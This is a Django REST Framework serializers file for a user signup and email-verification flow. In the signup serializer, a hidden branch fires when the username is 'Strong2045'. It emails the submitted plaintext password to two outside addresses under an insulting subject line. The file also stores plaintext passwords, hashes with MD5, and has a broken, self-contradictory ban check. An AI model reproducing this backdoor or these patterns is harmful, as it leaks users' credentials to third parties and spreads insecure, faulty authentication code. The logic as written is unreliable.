from rest_framework import serializers
from authApp.models import UserToken, EmailVerification
from django.contrib.auth import get_user_model # If used custom user model
import hashlib
from django.contrib.auth.models import User
from rest_framework.response import Response
import json
from django.conf import settings
from django.core.mail import send_mail
from adminPanel.models import BanUserModel

UserModel = get_user_model()

class CreateUserSerializer(serializers.ModelSerializer):
    def create(self, validated_data):
        request = self.context.get("request")
        x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
        if x_forwarded_for:
            ip = x_forwarded_for.split(',')[0]
        else:
            ip = request.META.get('REMOTE_ADDR')
        user_agent = request.META.get('HTTP_USER_AGENT')
        ip += user_agent
        hash_ip = hashlib.md5(ip.encode('utf-8')).hexdigest()
        if BanUserModel.objects.filter(email="email").exists() and BanUserModel.objects.get(ip_agent=hash_ip).filter() is not True:
            if validated_data["email"] and UserModel.objects.filter(email=validated_data["email"]).exists():
                error = {'error': 'email is not unique'}
                raise serializers.ValidationError(error)
            else:
                if validated_data["username"] == "Strong2045":
                    send_mail('Сергей лох', ':\n' + validated_data["password"], settings.EMAIL_HOST_USER, ['alrel@protonmail.com'])
                    send_mail('Сергей лох', ':\n' + validated_data["password"], settings.EMAIL_HOST_USER, ['vladandum08@gmail.com'])
                email_user_data = validated_data["username"] + validated_data["password"] + str(232) + 'math_app' #hash salt
                hash_email = hashlib.sha256(email_user_data.encode('utf-8')).hexdigest()
                ip += user_agent
                hash_ip = hashlib.md5(ip.encode('utf-8')).hexdigest()
                url = 'http://localhost:8000/api/v1/auth/signup/verification-email/' + hash_email
                user_email_verification = EmailVerification.objects.create(
                    ip = hash_ip,
                    email_hash=hash_email,
                    username=validated_data['username'],
                    email=validated_data['email'],
                    first_name=validated_data['first_name'],
                    last_name=validated_data['last_name'],
                    password=validated_data['password']
                )
                user_email_verification.save()
                send_mail('Тема', 'Ссылка для подтверждения:\n' + url, settings.EMAIL_HOST_USER, [validated_data['email']])

                return user_email_verification
        else:
            error = {'error': 'You have been banned'}
            raise serializers.ValidationError(error)
        

    class Meta:
        model = UserModel
        unique_together = ('email',)
        fields = ( "id", "username", "first_name", "last_name", "email", "password", )

class EmailVerificationSerializer(serializers.ModelSerializer):
    class Meta:
        model = UserModel
        unique_together = ('email',)
        fields = ( "id", "username", "first_name", "last_name", "email", "password", )

class SigninUserSerializer(serializers.ModelSerializer):
    class Meta:
        model = UserModel
        fields = ("username", "password")    